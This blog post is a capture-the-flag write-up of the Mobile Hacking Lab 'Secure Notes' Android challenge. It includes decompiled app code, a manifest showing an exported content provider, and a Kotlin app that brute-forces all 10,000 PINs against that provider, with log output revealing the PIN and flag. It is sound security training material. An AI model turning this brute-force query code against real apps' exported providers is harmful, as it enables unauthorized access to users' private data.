---
layout: post
title: Secure Notes - Mobile Hacking Lab
color: rgb(51,122,183)
tags: [Mobile Hacking lab, Android Security]
comments: true
share: false
excerpt_separator: <!--more-->
---

The [Secure Notes](https://www.mobilehackinglab.com/course/lab-secure-notes) lab gives the opportunity to program an Android application to uncover the hidden PIN and flag. <!--more--> In this blog post, we will create an application to interact with Secure Notes to obtain the PIN and flag.

### Introduction

The first step is to open the application. Upon opening, we are presented with a textView to input a PIN. Entering a random PIN results in the message `[ERROR: Incorrect PIN]`. Let's delve into the application's source code using JADX.


### Static Analysis

We start by examining the `MainActivity`, which contains functions that seem promising in our quest for the correct PIN. In the method `onCreate$lambda$0`, the application queries a provider named `SecretProvider`.


```java
//  MainActivity

package com.mobilehackinglab.securenotes;

...
import kotlin.jvm.internal.Intrinsics;

/* compiled from: MainActivity.kt */
@Metadata(m30d1 = {"\u0000&\n\u0002\u0018\u0002\n\u0002\u0018\u0002\n\u0002\b\u0002\n\u0002\u0018\u0002\n\u0000\n\u0002\u0010\u0002\n\u0000\n\u0002\u0018\u0002\n\u0002\b\u0002\n\u0002\u0010\u000e\n\u0000\u0018\u00002\u00020\u0001B\u0005¢\u0006\u0002\u0010\u0002J\u0012\u0010\u0005\u001a\u00020\u00062\b\u0010\u0007\u001a\u0004\u0018\u00010\bH\u0014J\u0010\u0010\t\u001a\u00020\u00062\u0006\u0010\n\u001a\u00020\u000bH\u0002R\u000e\u0010\u0003\u001a\u00020\u0004X\u0082.¢\u0006\u0002\n\u0000¨\u0006\f"}, m29d2 = {"Lcom/mobilehackinglab/securenotes/MainActivity;", "Landroidx/appcompat/app/AppCompatActivity;", "()V", "binding", "Lcom/mobilehackinglab/securenotes/databinding/ActivityMainBinding;", "onCreate", "", "savedInstanceState", "Landroid/os/Bundle;", "querySecretProvider", "pin", "", "app_debug"}, m28k = 1, m27mv = {1, 9, 0}, m25xi = ConstraintLayout.LayoutParams.Table.LAYOUT_CONSTRAINT_VERTICAL_CHAINSTYLE)
/* loaded from: classes3.dex */
public final class MainActivity extends AppCompatActivity {
    private ActivityMainBinding binding;

    /* JADX INFO: Access modifiers changed from: protected */
    @Override // androidx.fragment.app.FragmentActivity, androidx.activity.ComponentActivity, androidx.core.app.ComponentActivity, android.app.Activity
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        ActivityMainBinding inflate = ActivityMainBinding.inflate(getLayoutInflater());
        Intrinsics.checkNotNullExpressionValue(inflate, "inflate(...)");
        this.binding = inflate;
        ActivityMainBinding activityMainBinding = null;
        if (inflate == null) {
            Intrinsics.throwUninitializedPropertyAccessException("binding");
            inflate = null;
        }
        setContentView(inflate.getRoot());
        ActivityMainBinding activityMainBinding2 = this.binding;
        if (activityMainBinding2 == null) {
            Intrinsics.throwUninitializedPropertyAccessException("binding");
        } else {
            activityMainBinding = activityMainBinding2;
        }
        activityMainBinding.submitPinButton.setOnClickListener(new View.OnClickListener() { // from class: com.mobilehackinglab.securenotes.MainActivity$$ExternalSyntheticLambda0
            @Override // android.view.View.OnClickListener
            public final void onClick(View view) {
                MainActivity.onCreate$lambda$0(MainActivity.this, view);
            }
        });
    }

    /* JADX INFO: Access modifiers changed from: private */
    public static final void onCreate$lambda$0(MainActivity this$0, View it) {
        Intrinsics.checkNotNullParameter(this$0, "this$0");
        ActivityMainBinding activityMainBinding = this$0.binding;
        if (activityMainBinding == null) {
            Intrinsics.throwUninitializedPropertyAccessException("binding");
            activityMainBinding = null;
        }
        String enteredPin = activityMainBinding.pinEditText.getText().toString();
        this$0.querySecretProvider(enteredPin);
    }

    private final void querySecretProvider(String pin) {
        String resultText;
        ActivityMainBinding activityMainBinding;
        Uri uri = Uri.parse("content://com.mobilehackinglab.securenotes.secretprovider");
        String selection = "pin=" + pin;
        Cursor cursor = getContentResolver().query(uri, null, selection, null, null);
        ActivityMainBinding activityMainBinding2 = null;
        if (cursor != null) {
            Cursor cursor2 = cursor.moveToFirst() ? cursor : null;
            if (cursor2 != null) {
                Integer valueOf = Integer.valueOf(cursor2.getColumnIndex("Secret"));
                int it = valueOf.intValue();
                if (!(it != -1)) {
                    valueOf = null;
                }
                if (valueOf != null) {
                    int it2 = valueOf.intValue();
                    resultText = cursor.getString(it2);
                    if (resultText == null) {
                        resultText = "[ERROR: Incorrect PIN]";
                    }
                    activityMainBinding = this.binding;
                    if (activityMainBinding != null) {
                        Intrinsics.throwUninitializedPropertyAccessException("binding");
                    } else {
                        activityMainBinding2 = activityMainBinding;
                    }
                    activityMainBinding2.resultTextView.setText(resultText);
                    if (cursor == null) {
                        cursor.close();
                        return;
                    }
                    return;
                }
            }
        }
        resultText = null;
        if (resultText == null) {
        }
        activityMainBinding = this.binding;
        if (activityMainBinding != null) {
        }
        activityMainBinding2.resultTextView.setText(resultText);
        if (cursor == null) {
        }
    }
}
```


Looking into the `querySecretProvider` function, we find that it takes the user-input PIN and queries a content provider to validate if the correct PIN was entered. If the correct PIN is provided, it displays a string, presumably our flag. Now, how can we exploit this Content Provider? The first step is to check the `AndroidManifest.xml` to see if it's exported.

```xml
<!--AndroidManifest.xml-->

<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android" android:versionCode="1" android:versionName="1.0" android:compileSdkVersion="34" android:compileSdkVersionCodename="14" package="com.mobilehackinglab.securenotes" platformBuildVersionCode="34" platformBuildVersionName="14">
    <uses-sdk android:minSdkVersion="24" android:targetSdkVersion="33"/>
    <permission android:name="com.mobilehackinglab.securenotes.DYNAMIC_RECEIVER_NOT_EXPORTED_PERMISSION" android:protectionLevel="signature"/>
    <uses-permission android:name="com.mobilehackinglab.securenotes.DYNAMIC_RECEIVER_NOT_EXPORTED_PERMISSION"/>
    <application android:theme="@style/Theme.SecureNotes" android:label="@string/app_name" android:icon="@mipmap/ic_launcher" android:debuggable="true" android:allowBackup="true" android:supportsRtl="true" android:extractNativeLibs="false" android:fullBackupContent="@xml/backup_rules" android:roundIcon="@mipmap/ic_launcher_round" android:appComponentFactory="androidx.core.app.CoreComponentFactory" android:dataExtractionRules="@xml/data_extraction_rules">
        <provider android:name="com.mobilehackinglab.securenotes.SecretDataProvider" android:enabled="true" android:exported="true" android:authorities="com.mobilehackinglab.securenotes.secretprovider"/>
        <activity android:name="com.mobilehackinglab.securenotes.MainActivity" android:exported="true">
            <intent-filter>
                <action android:name="android.intent.action.MAIN"/>
                <category android:name="android.intent.category.LAUNCHER"/>
            </intent-filter>
        </activity>
        <provider android:name="androidx.startup.InitializationProvider" android:exported="false" android:authorities="com.mobilehackinglab.securenotes.androidx-startup">
            <meta-data android:name="androidx.emoji2.text.EmojiCompatInitializer" android:value="androidx.startup"/>
            <meta-data android:name="androidx.lifecycle.ProcessLifecycleInitializer" android:value="androidx.startup"/>
            <meta-data android:name="androidx.profileinstaller.ProfileInstallerInitializer" android:value="androidx.startup"/>
        </provider>
        <receiver android:name="androidx.profileinstaller.ProfileInstallReceiver" android:permission="android.permission.DUMP" android:enabled="true" android:exported="true" android:directBootAware="false">
            <intent-filter>
                <action android:name="androidx.profileinstaller.action.INSTALL_PROFILE"/>
            </intent-filter>
            <intent-filter>
                <action android:name="androidx.profileinstaller.action.SKIP_FILE"/>
            </intent-filter>
            <intent-filter>
                <action android:name="androidx.profileinstaller.action.SAVE_PROFILE"/>
            </intent-filter>
            <intent-filter>
                <action android:name="androidx.profileinstaller.action.BENCHMARK_OPERATION"/>
            </intent-filter>
        </receiver>
    </application>
</manifest>
```

We observe that the content provider is exported, allowing us to create our application to interact with it more easily. Additionally, we need to implement the `DYNAMIC_RECEIVER_NOT_EXPORTED_PERMISSION` permission.

### Developing our application

We begin by opening Android Studio and creating a project. The first step is to modify our `AndroidManifest.xml` by adding the following lines.

```xml
...
    xmlns:tools="http://schemas.android.com/tools">
    <!--Add this part-->
    <uses-permission android:name="com.mobilehackinglab.securenotes.DYNAMIC_RECEIVER_NOT_EXPORTED_PERMISSION"/>
    <queries>
        <package android:name="com.mobilehackinglab.securenotes" />
    </queries>
    <!--To Here-->
    <application...
    ...

</manifest>
```

This allows our application to make queries to `com.mobilehackinglab.securenotes`, the application implementing the PIN, and we use the permission `DYNAMIC_RECEIVER_NOT_EXPORTED_PERMISSION` to ensure we can communicate with it.

After modifying the manifest, all that's left is to program our `MainActivity.kt` class.

```kotlin
class MainActivity : AppCompatActivity() {
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)
        for (i in 0..9999) {
            exploit(i)
        }
    }

    @SuppressLint("Range")
    private fun exploit(pinValue: Int){
        val uri = Uri.parse("content://com.mobilehackinglab.securenotes.secretprovider")
        val pin = String.format("pin=%04d",pinValue)
        val cursor = contentResolver.query(uri, null, pin, null, null)
        cursor?.apply {
            if (moveToFirst()) {
                do {
                    val data = getString(getColumnIndex("Secret"))
                    Log.d("Content:", "$pin secret: $data")
                } while (moveToNext())
            }
            close()
        }
    }

}
```

This code iterates through all possible PINs, showing the attempted PIN and its associated secret. By running the application and waiting a bit, we obtain this output.

```
2024-01-29 09:20:09.480  8882-8882  Content:                com.mobile.securenotes               D  pin=1973 secret: K���[�H���82�,�`�mt���b.e
2024-01-29 09:20:31.200  8882-8882  Content:                com.mobile.securenotes               D  pin=2241 secret: +Ih��,�;�K#P�^��s����%��f��
2024-01-29 09:20:48.808  8882-8882  Content:                com.mobile.securenotes               D  pin=2463 secret: c�*��:�Q�ҋ�g 9�U�7��3^�"T��
2024-01-29 09:20:58.067  8882-8882  Content:                com.mobile.securenotes               D  pin=2580 secret: CTF{D1d_y0u_gu3ss_1t!1?}
2024-01-29 09:21:02.699  8882-8882  Content:                com.mobile.securenotes               D  pin=2638 secret: a�m+��h(F
                                                                                                    ՚*y4�G���5��?
2024-01-29 09:21:41.101  8882-8882  Content:                com.mobile.securenotes               D  pin=3120 secret: ����[�۵���I"���"��A�Ks??�
2024-01-29 09:21:44.857  8882-8882  Content:                com.mobile.securenotes               D  pin=3166 secret: ��5(񢃪�)ʞ}ΰl?o(5(]���D��zq|
```

We can see that we discovered the correct PIN, which is 2580, and the flag! `CTF{D1d_y0u_gu3ss_1t!1?}`


### Conclusion

This lab provides hands-on experience in reverse engineering an Android application, demonstrating an insecure content provider. From there, it offers the opportunity to learn how to create an Android application to interact with another to obtain a flag. What an amazing challenge! For a hands-on experience with these concepts, visit the lab at [MobileHackingLab - Secure Notes](https://www.mobilehackinglab.com/course/lab-secure-notes). Embark on a journey of discovery and enhance your skills in mobile security.